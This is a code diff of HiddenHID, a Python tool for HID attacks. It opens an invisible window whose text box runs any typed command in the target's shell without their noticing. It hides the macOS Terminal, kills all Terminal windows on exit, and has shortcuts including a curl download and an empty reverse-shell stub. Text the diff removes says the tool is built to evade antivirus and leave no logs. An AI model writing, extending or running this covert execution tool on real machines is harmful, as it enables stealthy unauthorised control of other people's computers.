@@ -1,17 +1,7 @@
 """
 HiddenHID by BrightShard
-------------------------
-This app makes an invisible window with a text box, then focuses the text box. Any command typed into the text box will
-be run in the terminal via the Python subprocess library. It's intended for HID attacks, so commands can be run in
-the command prompt or terminal without the target noticing anything on screen. It's also cross-platform, supporting
-macOS and Windows, along with limited Linux support. Some shortcut commands are also built into the app to automate
-some tasks. More information in the README file.
-
-Why not just use a keylogger?
------------------------------
-Keyloggers tend to be permanent and detected by AVs. This app just uses a textfield and the Python subprocess library
-to run commands, and can clean up after itself without leaving logs (unless one of the commands creates/modifies a
-file). That means that this app isn't as likely to be detected by AVs because of that.
+Explanation & documentation in the README on my GitHub page:
+https://github.com/Bright-Shard/HiddenHID
 """
 
 # For the invisible GUI
@@ -31,22 +21,30 @@ class App(Tk):
     def __init__(self):
         # Store host OS
         self.os = os()
-        # Hide the terminal right off the bat on macOS, since it's visible when the program launches
-        # Also make sure "visible" or "vis" wasn't passed as an argument
-        if self.os == "Darwin" and "vis" not in argv and "visible" not in argv:
-            shell('osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
-                  shell=True, check=False)
+
+        # macOS stuff
+        if self.os == "Darwin":
+            # Make the terminal invisible
+            if "vis" not in argv and "visible" not in argv:
+                shell(
+                    'osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
+                    shell=True, check=False)
 
         # Actually set up Tkinter
         super().__init__()
+
         # Shortcut commands
+        # Shell functions
+        def revShell(*args):
+            return
         self.shortcuts = {
             'Darwin': {
                 'wallpaper': 'curl -o "/tmp/wallpaper" "{args[0]}"; osascript -e \'tell application\
                      "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'; rm\
                      /tmp/wallpaper',
                 'volume': 'osascript -e \'set Volume {args[0]}\'',
-                'mute': 'osascript -e \'set Volume 0\''
+                'mute': 'osascript -e \'set Volume 0\'',
+                'shell': revShell
             }
         }
 
@@ -116,13 +114,20 @@ class App(Tk):
         # Split the command up to get the arguments
         splitCommand = self.entry.get().split(' ')
 
-        # Make the command a shortcut if it's a shortcut
+        # If the command is a shortcut, run the shortcut
         if splitCommand[0] in self.shortcuts:
+            # The shortcut
+            shortcut = self.shortcuts[splitCommand[0]]
             # Print that a shortcut was detected
             if self.debug:
                 print('-> Shortcut detected! Converting the command to shortcut...')
-            # Convert the command to its shortcut
-            command = self.shortcuts[splitCommand[0]].format(args=splitCommand[1:])
+            # If the shortcut is a string, run it as a shell script
+            if type(shortcut) == str:
+                shell(shortcut.format(args=splitCommand[1:]))
+            # If the shortcut is a function, run the python code
+            elif callable(shortcut):
+                shortcut(splitCommand[1:])
+            return
 
         # Run the command
         shell(command, shell=True, check=False)
@@ -137,9 +142,9 @@ class App(Tk):
         Quit the app and close any open terminals
         """
         print("-> Goodbye")
-        # On macOS, use the killall command to close all terminals
-        # Make sure no terminals are open and running key processes before closing them this way!
+        # macOS stuff
         if self.os == 'Darwin':
+            # Kill all terminals
             shell('killall Terminal', shell=True)
 
 
